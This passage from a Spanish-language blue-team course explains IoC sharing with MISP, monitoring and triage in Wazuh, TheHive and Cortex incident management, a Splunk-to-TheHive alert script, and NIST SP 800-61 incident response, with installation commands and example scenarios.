| ------------------------------------ | ------------------------------------------ |
| 📥 Importar IoCs de fuentes externas | Feeds de virus, malware, APTs              |
| 📤 Compartir eventos y amenazas      | Con otros SOC o partners                   |
| 🧠 Enriquecer amenazas               | Añadir contexto: tipo de ataque, grupo APT |
| 📡 Integración con SIEM/EDR          | Exportar los IoCs hacia otras herramientas |

---

### 📦 4. Instalación de MISP (modo rápido con Docker)

MISP es complejo de instalar manualmente, pero con Docker es mucho más sencillo.

---

#### ✅ Requisitos mínimos

- Linux (Ubuntu recomendado)
- Docker y Docker Compose instalados
- 4GB RAM y 2 CPUs mínimo

---

#### ⚙️ Paso 1: Clonar repositorio oficial de MISP Docker

```bash
git clone https://github.com/MISP/misp-dockerized
cd misp-dockerized
```

---

#### ⚙️ Paso 2: Crear archivo `.env` y configurar puertos

```bash
cp templates/misp.env misp.env
nano misp.env
```

Puedes modificar:

```env
MISP_FQDN=localhost
MISP_EMAIL=admin@example.com
MISP_PASSWORD=admin1234
```

---

#### ⚙️ Paso 3: Levantar los contenedores

```bash
docker compose up -d
```

---

#### 🌐 Paso 4: Acceder a la consola web

Ir al navegador:

```
http://localhost
```

Usuario: `admin@example.com`
Contraseña: `admin1234`

---

### 🧪 5. Ejemplo completo: Usar MISP para detectar un malware

#### 🎯 Escenario:

Un analista sube un evento a MISP con un IoC: un **hash de un archivo malicioso** y una **IP de comando y control (C2)**.

---

#### 🔹 Paso 1: Crear evento en MISP

- Ir a **Event Actions > Add Event**
- Llenar título: `Malware detectado en Lima - Julio 2025`
- TLP: White (sin restricción)
- Date: 2025-07-23

---

#### 🔹 Paso 2: Añadir atributos (IoC)

- Añadir atributo:

  - Type: **ip-dst**
  - Value: `185.234.219.121`

- Añadir otro atributo:

  - Type: **md5**
  - Value: `e99a18c428cb38d5f260853678922e03`

- Guardar evento

---

#### 🔹 Paso 3: Enviar alerta al SIEM

Desde MISP, puedes exportar este evento:

- Como JSON (para Splunk)
- Como Snort/Suricata rules
- Como STIX 2.0 (formato estándar CTI)

---

#### 🔹 Paso 4: Verificar con tus endpoints

Tu equipo puede revisar en antivirus, EDR o logs si esa IP fue contactada o ese hash ejecutado.

---

#### 🔹 Paso 5: Compartir con otras organizaciones

Si formas parte de una comunidad (ISAC, CERT, sectorial), puedes:

- Compartir automáticamente el evento
- Agregar tags: `APT29`, `Ransomware`, `TTPs`

---

### 🎁 Bonus: Feeds públicos para MISP

Puedes integrar automáticamente fuentes de amenazas:

```bash
Settings > Sync Actions > List Feeds > Enable feeds como CIRCL, Abuse.ch, etc.
```

---

### 🧠 Conclusión

| Herramienta | ¿Para qué sirve?                                        |
| ----------- | ------------------------------------------------------- |
| **IoC**     | Detectar huellas de ataques                             |
| **MISP**    | Gestionar y compartir IoCs inteligentemente             |
| **SIEM**    | Correlacionar los IoCs con la actividad de tus sistemas |
| **EDR**     | Bloquear o responder ante amenazas asociadas a los IoCs |

---

[🔼](#índice)

---

## **550. Monitorización & Triage**

### 📌 ¿Qué es la Monitorización en Ciberseguridad?

La **monitorización** es el proceso continuo de **observar** y **registrar** la actividad de sistemas, redes, endpoints y aplicaciones en busca de **comportamientos sospechosos o maliciosos**.

---

#### 🎯 Objetivo:

- **Detectar ataques** en tiempo real o post-evento
- **Alertar al equipo de seguridad**
- **Recolectar evidencia** de incidentes
- **Garantizar cumplimiento** (auditorías, normativas)

---

#### 🧠 Ejemplo real:

> Imagínate que alguien intenta acceder al servidor con 10 contraseñas diferentes en 1 minuto.

🟡 Monitorización lo detecta

🔴 Genera una **alerta de fuerza bruta**

🟢 El analista lo revisa (Triage) y decide si es real o falso positivo

---

### 🧪 ¿Qué se monitorea?

| Área             | Ejemplo de actividad                                   |
| ---------------- | ------------------------------------------------------ |
| 🔐 Autenticación | Inicios de sesión fallidos o desde países inusuales    |
| 🧾 Archivos      | Cambios o accesos a archivos sensibles                 |
| 🖥️ Procesos      | Ejecución de scripts sospechosos (ej. PowerShell raro) |
| 🌐 Red           | Conexiones salientes a IPs maliciosas                  |
| 📁 Sistema       | Instalación de programas sin autorización              |

---

### 🧪 ¿Qué herramientas se usan?

| Herramienta                    | Función                                                    |
| ------------------------------ | ---------------------------------------------------------- |
| **SIEM** (como Splunk o Wazuh) | Centraliza logs y genera alertas                           |
| **EDR** (como OpenEDR)         | Detecta y responde a comportamientos en endpoints          |
| **Sysmon**                     | Recolecta eventos avanzados de Windows                     |
| **Osquery**                    | Permite consultas tipo SQL sobre eventos del sistema       |
| **Filebeat/Winlogbeat**        | Envía logs a un servidor central (ej. Elasticsearch/Wazuh) |

---

### 🧪 ¿Qué es el _Triage_?

El **triage** (como en medicina) es el **proceso de priorizar alertas** para:

1. Revisar si son verdaderas o falsos positivos
2. Ver si hay que escalarlo a un incidente
3. Tomar acciones rápidas (bloquear, aislar, investigar)

---

#### ⚠️ ¿Por qué es clave?

Un analista SOC puede recibir **miles de alertas al día**. El triage ayuda a:

- No perder tiempo en alertas falsas
- Detectar ataques reales rápidamente
- Priorizar las amenazas más peligrosas

---

### 🧰 ¿Cómo se instala un entorno de Monitorización?

Hay varias formas, pero te muestro una **fácil y funcional** con:

- ✅ **Wazuh** como SIEM
- ✅ **Winlogbeat** como agente para enviar logs de Windows
- ✅ **Kibana** para visualizar
- ✅ **Reglas para triage automatizado**

---

#### 🔧 Instalación básica de Wazuh (usando Docker en Linux)

##### 1. Clonar Wazuh Docker:

```bash
git clone https://github.com/wazuh/wazuh-docker.git
cd wazuh-docker
```

##### 2. Levantar el entorno:

```bash
docker-compose -f generate-indexer-certs.yml run --rm generator
docker-compose up -d
```

> Esto instalará:
> 🔵 Wazuh Manager
> 🟡 Wazuh Dashboard (Kibana)
> 🟢 Wazuh Indexer (OpenSearch)

---

#### 🧑‍💻 Agente en Windows (Winlogbeat)

1. Descargar [Winlogbeat](https://www.elastic.co/beats/winlogbeat)
2. Editar `winlogbeat.yml`:

```yaml
output.logstash:
  hosts: ["<IP-del-servidor>:5044"]
```

3. Instalar servicio:

```bash
winlogbeat install
winlogbeat start
```

---

### ✅ Ejemplo completo de Monitorización + Triage

#### 🎯 Escenario:

Un atacante hace fuerza bruta desde Rusia en el servidor de Gustavo.

---

#### 🟢 Paso 1: Wazuh recibe los logs

- Detecta múltiples intentos fallidos de inicio de sesión desde IP `185.34.22.55`
- Se activa una **regla de alerta de Wazuh**

---

#### 🟡 Paso 2: Triaging (clasificación)

El analista revisa:

- Hora: 3 AM
- IP: No es interna
- Usuario: `admin`
- Resultado: **Fallo 10 veces seguidas**

🛑 Clasifica como **actividad sospechosa grave**

---

#### 🔴 Paso 3: Acción inmediata

- Aísla la IP atacante
- Cambia la contraseña del admin
- Investiga si hubo acceso exitoso

---

#### 📝 Paso 4: Registro del incidente

Se registra en el sistema de tickets o IRP (Incident Response Platform):

- Hora
- Acciones realizadas
- Usuarios afectados
- Clasificación final: **Intento fallido bloqueado**

---

### 🎁 Bonus: Reglas automáticas en Wazuh para triage

Wazuh viene con cientos de reglas, por ejemplo:

```xml
<rule id="100004" level="10">
  <if_sid>18107</if_sid>
  <match>authentication failed</match>
  <frequency>5</frequency>
  <timeframe>60</timeframe>
  <description>Multiple authentication failures in 1 min</description>
</rule>
```

> Esto generará alerta si hay más de 5 fallos de login en 1 minuto.

---

### 🧠 Conclusión rápida

| Concepto           | Explicación fácil                                     |
| ------------------ | ----------------------------------------------------- |
| **Monitorización** | Escuchar todo lo que pasa en tu sistema y red         |
| **Triage**         | Revisar y clasificar las alertas importantes          |
| **SIEM/EDR/Beats** | Herramientas para recolectar, visualizar y reaccionar |

---

[🔼](#índice)

---

## **551. Ticketing y gestión de incidentes - TheHive**

### 🛡️ ¿Qué es TheHive?

**TheHive** es una plataforma **de gestión de incidentes de ciberseguridad (IR - Incident Response)**. Permite a los analistas de un SOC o equipo Blue Team:

- Crear y organizar **casos** e **investigaciones**.
- Colaborar en equipo en **tiempo real**.
- Automatizar la recolección de datos (con **Cortex**).
- Documentar evidencias, hallazgos, indicadores de compromiso (IoCs), y mucho más.

---

### 🧠 ¿Para qué sirve TheHive?

| Función               | Descripción                                  |
| --------------------- | -------------------------------------------- |
| 📥 Ingesta de alertas | Recibe alertas de SIEM, EDR, etc. como casos |
| 📂 Gestión de casos   | Asignación de tareas, analistas y evidencias |
| 🕵️ Análisis forense   | Documentar pasos de investigación            |
| 🚨 Respuesta          | Coordinar acciones de mitigación             |
| 📊 Reportes           | Generar informes de los incidentes           |

---

### 🔎 Ejemplo fácil de entender

🎯 Supón que Wazuh detecta un intento de fuerza bruta.

- Wazuh envía una **alerta a TheHive**.
- Se **crea un nuevo caso automáticamente**.
- Un analista lo recibe, investiga, y documenta:

  - IP sospechosa
  - Logs del sistema
  - Acción: bloqueo de IP

🎯 Todo queda guardado con fecha y hora.

---

### 🛠️ Instalación de TheHive (modo práctico)

#### 🧱 Requisitos

- Linux (Ubuntu 20.04 recomendado)
- Java 11
- Elasticsearch 7.x
- TheHive 5.x

---

#### 🔧 Paso a paso: instalación en Ubuntu 20.04

##### 1. Instala Java 11

```bash
sudo apt update
sudo apt install openjdk-11-jre-headless
```

##### 2. Instala Elasticsearch 7.x

```bash
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
sudo apt install apt-transport-https
echo "deb https://artifacts.elastic.co/packages/7.x/apt stable main" | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list
sudo apt update && sudo apt install elasticsearch
sudo systemctl enable elasticsearch
sudo systemctl start elasticsearch
```

##### 3. Instala TheHive

```bash
wget https://dl.strangebee.com/thehive/5/package/thehive_5.2.4-1_all.deb
sudo dpkg -i thehive_5.2.4-1_all.deb
```

##### 4. Configura TheHive

Edita el archivo `/etc/thehive/application.conf` si necesitas cambiar puerto o base de datos.

##### 5. Inicia el servicio

```bash
sudo systemctl start thehive
sudo systemctl enable thehive
```

Ahora puedes acceder a la interfaz web en:

```
http://localhost:9000
```

---

### 🧪 Ejemplo completo de uso de TheHive

#### 🎯 Escenario realista:

1. **Wazuh** detecta una conexión sospechosa desde una IP de Rusia.

2. Wazuh envía alerta por webhook a **TheHive** (puede hacerse con un conector o script).

3. TheHive crea un **caso automático**:

   - Título: _Conexión sospechosa desde IP externa_
   - Severidad: Alta
   - Fuente: Wazuh
   - Tags: `intrusion`, `brute-force`, `russia`

4. El analista recibe la asignación:

   - Tarea 1: Revisar logs
   - Tarea 2: Verificar autenticación
   - Tarea 3: Consultar VirusTotal con IP

5. El analista documenta todo:

   - Evidencias (logs .txt)
   - Observaciones (notas internas)
   - Acciones tomadas (IP bloqueada en firewall)

6. Agrega los **IoCs** (indicadores):

   - IP sospechosa
   - Usuario objetivo
   - Timestamp del evento

7. El caso se **cierra** con el estado: "Resuelto – Mitigado"

---

### 🎁 Bonus: TheHive + Cortex

**Cortex** es otra herramienta complementaria que puedes instalar para:

- Automatizar consultas a VirusTotal, AbuseIPDB, MISP, etc.
- Hacer análisis de archivos o URLs sospechosas
- Integrarse con TheHive para enriquecer los casos

> ¿Quieres que también te guíe paso a paso en la instalación de Cortex? Te lo preparo si lo deseas.

---

### 📌 Conclusión resumida

| Elemento        | Función                                                |
| --------------- | ------------------------------------------------------ |
| **TheHive**     | Gestionar alertas y casos                              |
| **Casos**       | Cada incidente documentado con tareas, análisis e IoCs |
| **Alertas**     | Entradas automáticas desde SIEM/EDR                    |
| **Equipo**      | Analistas colaboran sobre el mismo caso                |
| **Instalación** | En Ubuntu con Java 11 y Elasticsearch 7                |

---

[🔼](#índice)

---

## **552. Integración de Splunk con TheHive**

### 🔗 ¿Por qué integrar Splunk con TheHive?

Splunk te permite **detectar incidentes** en grandes volúmenes de datos (como logs, tráfico, etc.), mientras que TheHive permite **gestionar esos incidentes como casos**, con tareas, analistas, evidencias y automatizaciones.

La integración permite:

| Función                          | Ejemplo                                    |
| -------------------------------- | ------------------------------------------ |
| 📤 Automatizar creación de casos | Cuando Splunk detecta actividad sospechosa |
| 🔁 Mejorar flujo de trabajo      | SIEM → Gestión de incidentes (TheHive)     |
| 📎 Enviar información contextual | Logs, IPs, usuarios comprometidos          |
| 🚀 Respuesta rápida              | Equipo de respuesta actúa desde TheHive    |

---

### 🧠 ¿Cómo funciona?

El flujo típico es:

1. **Splunk detecta** una alerta → se genera una búsqueda programada (Scheduled Search).
2. **Splunk ejecuta un webhook (script o alert action)** → se conecta a la API de TheHive.
3. Se **crea un nuevo caso o alerta en TheHive**.
4. El analista trabaja el caso desde TheHive.

---

### 🛠️ Instalación y Configuración paso a paso

#### 🧱 Requisitos previos

- Splunk instalado y funcionando (Enterprise o Free)
- TheHive 5.x configurado (puerto 9000 por defecto)
- Tener un usuario en TheHive con API key

---

#### 1. 🔑 Obtener API Key desde TheHive

1. Entra a `http://localhost:9000` (o IP pública si está en red).
2. Inicia sesión con tu usuario admin.
3. Ve a `Settings > API Key` → Crea una nueva.
4. Copia esa API key, la usaremos en Splunk.

---

#### 2. 🧪 Crear una búsqueda programada en Splunk

Ejemplo: alerta por múltiples inicios de sesión fallidos

```spl
index=auth sourcetype=linux_secure "Failed password"
| stats count by src, user
| where count > 5
```

1. Guarda esta búsqueda como **alerta**:

   - Nombre: `Brute Force Detection`
   - Tipo: **Scheduled Alert**
   - Frecuencia: cada 5 minutos
   - Condición de activación: si `count > 5`

---

#### 3. 🧰 Crear un Alert Action personalizada (usando script)

##### Paso 1: Crea el script Python en Splunk

Ubicación:
`$SPLUNK_HOME/etc/apps/search/bin/send_to_thehive.py`

```python
import json
import requests
import sys

# Entrada del evento de alerta
payload = sys.stdin.read()

# Formateamos alerta como alerta de TheHive
alert = {
    "title": "Alerta de Splunk: Múltiples fallos de inicio",
    "type": "external",
    "source": "Splunk",
    "description": payload,
    "severity": 2  # 1: bajo, 2: medio, 3: alto, 4: crítico
}

# TheHive API endpoint y API Key
url = "http://localhost:9000/api/v1/alert"
headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer TU_API_KEY"
}

# Envío
response = requests.post(url, headers=headers, data=json.dumps(alert))

if response.status_code == 201:
    print("Alerta enviada correctamente.")
else:
    print("Error:", response.status_code, response.text)
```

> Reemplaza `"TU_API_KEY"` por la que generaste.

##### Paso 2: Haz el script ejecutable

```bash
chmod +x $SPLUNK_HOME/etc/apps/search/bin/send_to_thehive.py
```

---

#### 4. 🔔 Asociar la alerta al script

- Ve a `Settings > Searches, Reports, and Alerts`
- Edita `Brute Force Detection`
- En “Alert actions”, marca "Run a script"
- Script a ejecutar: `send_to_thehive.py`

---

### ✅ Ejemplo completo (flujo real)

🎯 Supongamos esto:

1. Un atacante intenta hacer **fuerza bruta** sobre un servidor.
2. Splunk detecta múltiples fallos de login.
3. La alerta `Brute Force Detection` se activa.
4. Splunk ejecuta `send_to_thehive.py`.
5. En TheHive aparece un nuevo caso:

   - Título: "Alerta de Splunk: Múltiples fallos de inicio"
   - Severidad: Media
   - Fuente: Splunk
   - Descripción: logs con las IPs, usuarios y fechas.

6. Un analista revisa y:

   - Agrega tareas (investigar IP, revisar logs)
   - Añade observaciones
   - Bloquea la IP sospechosa

---

### 🧠 Recomendaciones adicionales

| Consejo                      | Explicación                                        |
| ---------------------------- | -------------------------------------------------- |
| 🔐 Usa HTTPS                 | Protege el envío de alertas (usa Nginx como proxy) |
| 🛂 Controla la API Key       | Usa un usuario de solo envío                       |
| 🧪 Usa entornos de prueba    | Haz pruebas en máquinas virtuales antes            |
| 🔁 Automatiza más con Cortex | Enriquecimiento automático de IPs/URLs             |

---

### 📌 Conclusión

| Elemento     | Detalle                                                      |
| ------------ | ------------------------------------------------------------ |
| 💡 Objetivo  | Enviar alertas de Splunk como casos a TheHive                |
| ⚙️ Método    | Script en Python que usa API de TheHive                      |
| 📈 Resultado | Casos gestionables, trazables y colaborativos                |
| 🛡️ Beneficio | Respuesta más ágil, investigación documentada y centralizada |

---

[🔼](#índice)

---

## **553. TheHive + Cortex**

### 🧠 ¿Qué es TheHive?

**TheHive** es una plataforma de **gestión de incidentes de seguridad (IR – Incident Response)**. Permite crear casos, gestionar tareas, colaborar en equipo y seguir una trazabilidad de cada investigación.

**Piénsalo así**: cuando detectas un ataque o actividad sospechosa, usas TheHive para investigar, documentar, y actuar.

---

### 🧠 ¿Qué es Cortex?

**Cortex** es una plataforma que **automatiza análisis y enriquecimientos**.

Recibe datos (como IPs, dominios, archivos) y ejecuta **análisis automáticos** llamados **"analyzers"** y acciones llamadas **"responders"**.

Ejemplos de analizadores:

| Tipo de dato    | Análisis que puede hacer Cortex           |
| --------------- | ----------------------------------------- |
| IP              | Geolocalización, reputación en VirusTotal |
| URL             | Detección de phishing o malware           |
| Hash de archivo | Comparación en sandbox                    |
| Dominio         | Whois, reputación, DNS                    |

---

### 🔗 ¿Cómo se integran TheHive + Cortex?

1. TheHive envía **observables** (IP, hash, URL, etc.) a Cortex.
2. Cortex ejecuta automáticamente uno o varios analizadores.
3. TheHive recibe y **muestra los resultados**.
4. El analista puede decidir qué hacer (bloquear, investigar más, escalar).

---

### 🛠️ ¿Cómo se instalan?

#### ✅ Requisitos

- Ubuntu Server 20.04 o 22.04
- Java instalado (OpenJDK 11 para TheHive)
- Acceso a root o sudo
- Conexión a Internet (para instalar analizadores de Cortex)
- Docker (opcional, pero recomendado para Cortex)

---

#### 🚀 Instalación de TheHive (usando paquete DEB)

1. **Actualizar sistema:**

```bash
sudo apt update && sudo apt upgrade -y
```

2. **Instalar Java:**

```bash
sudo apt install openjdk-11-jre -y
```

3. **Agregar repositorio y clave de TheHive:**

```bash
wget -qO - https://artifacts.strangebee.com/apt/public.key | sudo apt-key add -
echo "deb https://artifacts.strangebee.com/apt stable main" | sudo tee /etc/apt/sources.list.d/thehive.list
```

4. **Instalar TheHive:**

```bash
sudo apt update
sudo apt install thehive -y
```

5. **Iniciar el servicio:**

```bash
sudo systemctl start thehive
sudo systemctl enable thehive
```

6. **Abrir en navegador:**
   `http://localhost:9000` o IP pública

---

#### 🧪 Instalación de Cortex (con Docker recomendado)

> Requiere Docker instalado previamente (`sudo apt install docker.io docker-compose`)

1. **Clonar el repositorio oficial:**

```bash
git clone https://github.com/TheHive-Project/Cortex.git
cd Cortex/docker
```

2. **Iniciar con Docker Compose:**

```bash
sudo docker-compose up -d
```

3. **Abrir en navegador:**
   `http://localhost:9001`

---

#### 🔐 Configurar usuarios y API keys

1. Entra a **TheHive** > Configura tu usuario
2. Crea una **API Key**
3. Entra a **Cortex** > crea usuario > genera su **API Key**

---

### 🔁 Integración entre ambos

1. En TheHive, ve a `Admin > Cortex`

2. Agrega un nuevo Cortex server:

   - **Nombre:** Cortex-Prod
   - **URL:** `http://localhost:9001`
   - **API Key:** la que generaste en Cortex
   - **Verify SSL:** No (si estás usando HTTP)

3. Haz clic en “Test connection” → si todo está bien, “OK”

---

### ⚙️ Instalar analizadores en Cortex

Desde la carpeta `Cortex/analyzers`, ejecuta:

```bash
cd analyzers
sudo bash install-analyzers.sh
```

Esto instalará analizadores como:

- **VirusTotal**
- **AbuseIPDB**
- **Shodan**
- **UrlScan.io**
- **MISP lookup**

📌 _Cada uno requiere configurar su propia API key en los archivos de configuración._

---

### 🧪 Ejemplo práctico completo

#### Escenario:

Detectamos una IP sospechosa en un servidor.

---

#### 🔍 Paso a paso

1. En TheHive creamos un **Caso** llamado “IP sospechosa detectada”.

2. Dentro del caso, agregamos un **Observable**:

   - Tipo: `ip`
   - Valor: `185.199.108.153` (una IP pública de GitHub, como ejemplo)

3. TheHive automáticamente consulta Cortex y muestra:

   - Geolocalización
   - Si está en listas negras
   - Reputación en VirusTotal
   - Whois del dominio asociado

4. El analista revisa los resultados:

   - Si se detecta como maliciosa → crea tareas: bloquear IP, generar reporte, etc.

---

#### Resultado visual:

| Observable      | Resultado desde Cortex                            |
| --------------- | ------------------------------------------------- |
| 185.199.108.153 | `Clean`, `Location: US`, `No malicious behavior`  |
| hash de archivo | VirusTotal: `5/68 engines` lo marcan como malware |
| URL             | `Phishing` detectado en 3 motores                 |

---

### 🧠 Beneficios clave

| Función             | Ventaja                                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------------------- |
| 🧠 TheHive + Cortex | Inteligencia + gestión de incidentes                                                                     |
| ⚡ Automatización   | Ahorro de tiempo con enriquecimiento automático                                                          |
| 📊 Visibilidad      | Todo el contexto técnico y de negocio en un solo lugar                                                   |
| 🛡️ Acción           | Posibilidad de usar **Cortex Responders** para tomar acciones: bloquear IP, enviar email, generar ticket |

---

### 📌 Conclusión

**TheHive** te ayuda a **gestionar incidentes**.
**Cortex** te ayuda a **enriquecer y actuar automáticamente** sobre los datos.

Juntos, forman una de las mejores combinaciones **gratuitas y de código abierto** para un **SOC** moderno.

---

[🔼](#índice)

---

## **554. Respuesta a incidentes de seguridad**

### 🧠 ¿Qué es la Respuesta a Incidentes de Seguridad?

La **respuesta a incidentes de seguridad** (IR, _Incident Response_) es el **conjunto de procedimientos que se activan cuando ocurre un evento de ciberseguridad** como:

- Un malware en un servidor
- Robo de credenciales
- Un ataque DDoS
- Acceso no autorizado
- Ransomware, etc.

Su objetivo es **contener, analizar, erradicar y recuperar** rápidamente para minimizar el daño.

---

### 🛡️ ¿Por qué es importante?

Sin una respuesta adecuada:

- Un malware puede propagarse a toda la red
- Se puede perder información confidencial
- Las operaciones de la empresa pueden detenerse
- Puedes sufrir multas por incumplir normativas

Con un buen plan, se actúa rápido, con coordinación, y con menor impacto.

---

### 📋 Fases de la Respuesta a Incidentes

Según el marco **NIST 800-61**, las fases de un proceso de respuesta son:

| Fase                                           | Objetivo                                               | Ejemplo                                                    |
| ---------------------------------------------- | ------------------------------------------------------ | ---------------------------------------------------------- |
| **1. Preparación**                             | Tener todo listo antes de que ocurra un incidente      | Antivirus actualizado, SIEM, playbooks, equipos entrenados |
| **2. Detección y Análisis**                    | Identificar y entender el incidente                    | Alertas de un SIEM, logs anómalos, usuario reporta         |
| **3. Contención, Erradicación y Recuperación** | Detener, eliminar el problema y volver a la normalidad | Aislar equipo infectado, borrar malware, restaurar backup  |
| **4. Post-Incidente**                          | Aprender y prevenir en el futuro                       | Informe, lecciones aprendidas, actualizar controles        |

---

### 🧰 Herramientas típicas que se usan

| Herramienta                       | Uso                                                      |
| --------------------------------- | -------------------------------------------------------- |
| **SIEM (Splunk, Wazuh)**          | Correlación de eventos, alertas                          |
| **TheHive**                       | Gestión de incidentes, tickets                           |
| **Cortex**                        | Análisis automatizado de amenazas                        |
| **VirusTotal, Shodan, AbuseIPDB** | Reputación de archivos/IPs                               |
| **EDR/XDR (como OpenEDR, Wazuh)** | Detección en endpoints                                   |
| **Playbooks**                     | Guías paso a paso para actuar según el tipo de incidente |

---

### 🛠️ ¿Cómo se prepara la infraestructura?

1. **Instala un SIEM** como Splunk, Wazuh, Graylog
2. **Instala un sistema de gestión de incidentes** como TheHive
3. **Integra una plataforma de enriquecimiento** como Cortex
4. **Configura alertas y reglas de correlación**
5. **Diseña procedimientos (playbooks)** para cada tipo de incidente
6. **Haz simulacros (tabletop exercises)** para entrenar a tu equipo

---

### 🧪 Ejemplo completo – Caso práctico

#### Escenario:

Una empresa detecta que un usuario de la red abrió un archivo sospechoso y el antivirus lo reportó como posible malware.

---

#### 🧩 Paso 1: Detección y Análisis

- El antivirus (AV) genera una alerta
- El agente EDR detecta actividad anómala del archivo
- El SIEM lo notifica a un analista

**Acciones del analista:**

- Recoge el hash del archivo y lo consulta en **VirusTotal**
- Detecta que 20 de 70 motores lo marcan como malware
- Marca el incidente como **“crítico”** en TheHive

---

#### 🛑 Paso 2: Contención

- Se conecta remotamente al equipo
- Lo **aísla de la red**
- Termina el proceso malicioso
- Cambia temporalmente las credenciales del usuario

---

#### 🧼 Paso 3: Erradicación y recuperación

- Elimina el archivo malicioso
- Revisa logs en Wazuh para ver si se replicó
- Usa un **backup limpio** para restaurar archivos dañados
- Reactiva el acceso del usuario con nueva contraseña

---

#### 📖 Paso 4: Post-Incidente

- Crea un informe técnico:

  - Qué pasó
  - Cómo se detectó
  - Qué se hizo
  - Qué se aprendió

- Se actualiza el antivirus y se agregan reglas de detección personalizadas
- Se entrena al personal para evitar abrir adjuntos sospechosos

---

### 🧪 Herramientas usadas en este ejemplo:

| Herramienta       | Uso                                    |
| ----------------- | -------------------------------------- |
| **Antivirus/EDR** | Detectó y bloqueó el archivo malicioso |
| **VirusTotal**    | Confirmó que el archivo era peligroso  |
| **Wazuh**         | Revisó si se propagó                   |
| **TheHive**       | Documentó y gestionó el caso           |
| **Cortex**        | Automatizó consultas de hash           |
| **SIEM**          | Correlacionó eventos y lanzó la alerta |
| **Backup**        | Restauró el sistema                    |

---

### 📌 Conclusión

La **respuesta a incidentes** es una de las funciones más importantes de un equipo de ciberseguridad.

Te permite actuar con rapidez, documentar todo, y minimizar daños.
Un equipo que **no está preparado** puede tardar días en reaccionar, mientras que uno bien entrenado **puede contener el daño en minutos**.

---

[🔼](#índice)

---

## **555. NIST SP 800-61: Computer Security Incident Handling Guide**

### 🧠 ¿Qué es el NIST SP 800-61?

Es una **guía publicada por el NIST** (National Institute of Standards and Technology) que establece **las mejores prácticas para manejar incidentes de seguridad informática**. Su nombre completo es:

> **NIST Special Publication 800-61 Revision 2: Computer Security Incident Handling Guide**

Es ampliamente utilizada en todo el mundo, tanto por gobiernos como empresas privadas.

---

### 🎯 ¿Para qué sirve?

- Define **qué hacer antes, durante y después** de un incidente de ciberseguridad.
- Proporciona un **modelo estructurado y repetible** para responder a incidentes.
- Ayuda a **minimizar el daño**, recuperar operaciones y prevenir que se repita.

---

### 🧩 Fases del manejo de incidentes según NIST SP 800-61

La guía propone **4 fases principales**, que forman un ciclo:

| Fase                                           | Descripción                                              | Ejemplo                                                |
| ---------------------------------------------- | -------------------------------------------------------- | ------------------------------------------------------ |
| **1. Preparación**                             | Estar listos antes de que ocurra un incidente            | Tener un equipo, herramientas, playbooks, backups      |
| **2. Detección y análisis**                    | Identificar e investigar si un incidente está ocurriendo | Revisar alertas del SIEM, logs, reportes de usuarios   |
| **3. Contención, erradicación y recuperación** | Detener el ataque, eliminarlo y restaurar el sistema     | Aislar equipo, borrar malware, restaurar datos         |
| **4. Actividades post-incidente**              | Aprender del incidente para mejorar                      | Informe técnico, lecciones aprendidas, actualizaciones |

---

### 🧰 Herramientas y elementos necesarios en cada fase

#### 1. **Preparación**

- Equipo de respuesta a incidentes (CSIRT o SOC)
- Herramientas: SIEM, antivirus, EDR, TheHive, backups
- Playbooks o guías paso a paso
- Capacitación del personal

#### 2. **Detección y Análisis**

- SIEM (ej. Wazuh, Splunk)
- Logs del sistema, firewall, red
- Notificaciones del antivirus o EDR
- Servicios como VirusTotal, AbuseIPDB

#### 3. **Contención, Erradicación y Recuperación**

- Scripts automatizados para aislar máquinas
- Restauración de backups
- Actualizaciones de software y firmas
- Coordinación entre equipos técnicos

#### 4. **Post-Incidente**

- Documentación del caso
- Reuniones para discutir lecciones aprendidas
- Ajustes de reglas de detección
- Informes para auditoría o normativas

---

### ⚙️ ¿Cómo se instala o implementa esta guía?

No se “instala” como un software. Se **adopta como marco de trabajo**:

1. Descargas la guía desde el sitio oficial:
   📎 [https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)

2. Definís un plan de respuesta basado en sus recomendaciones:

   - Definir roles: quién analiza, quién aprueba acciones, etc.
   - Crear documentos: manuales, checklist, contacto de emergencia
   - Asignar responsables: CSIRT o SOC
   - Configurar herramientas: SIEM, AV, TheHive, Cortex, etc.

3. Integrás la guía a tus procesos internos, como:

   - Seguridad en endpoints
   - Gestión de incidentes
   - Alertas automatizadas
   - Simulacros y revisiones periódicas

---

### 🧪 Caso práctico completo

#### 🎯 Escenario:

Una empresa recibe una alerta de su SIEM indicando que una IP externa está accediendo por RDP a un servidor interno, fuera de horario laboral.

---

#### 🔎 Fase 1: Detección y Análisis

- SIEM detecta comportamiento inusual (login remoto en horas extrañas)
- El analista revisa:

  - Logs de acceso al servidor
  - Dirección IP origen
  - VirusTotal y Shodan revelan que la IP es maliciosa

- Se confirma: acceso no autorizado → **incidente de seguridad**

---

#### 🛑 Fase 2: Contención

- Se **desconecta el servidor de la red**
- Se **revoca temporalmente las credenciales** utilizadas
- Se **informa al equipo de TI** y al jefe de seguridad

---

#### 🧼 Fase 3: Erradicación y recuperación

- Se realiza un escaneo completo del servidor
- Se eliminan archivos sospechosos
- Se parchean vulnerabilidades
- Se restauran datos desde backup
- Se vuelve a integrar el servidor en la red

---

#### 📖 Fase 4: Post-Incidente

- Se documenta el incidente en **TheHive**
- Se realiza una reunión de análisis (post-mortem)
- Se mejora el sistema de alertas del SIEM
- Se agrega doble factor de autenticación (2FA) al acceso RDP

---

### ✅ Resultado:

Gracias a seguir el modelo del **NIST 800-61**, la empresa:

- Detectó el incidente temprano
- Contuvo la amenaza rápidamente
- Restauró operaciones sin pérdida de datos
- Mejoró su sistema para prevenir futuros incidentes

---

### 📌 Conclusión

El **NIST SP 800-61** es una guía **imprescindible** si deseas implementar un **programa serio de respuesta a incidentes**.

No es un software, sino una **metodología probada**, estructurada y clara para proteger sistemas y responder eficazmente.

---

[🔼](#índice)

---

## **556. Uso de un SOAR - Splunk SOAR (Phantom)**

### 🧠 ¿Qué es un SOAR?

**SOAR** significa:

> **Security Orchestration, Automation, and Response**

Es una plataforma que ayuda a los analistas de seguridad a:

- Automatizar tareas repetitivas (como revisar IPs, escanear archivos, bloquear usuarios).
- Integrar herramientas (SIEM, EDR, antivirus, firewalls, etc.).
- Orquestar flujos de trabajo de respuesta ante incidentes.
- Estandarizar la gestión de incidentes con **playbooks automáticos**.

🔧 **Ejemplo simple:**

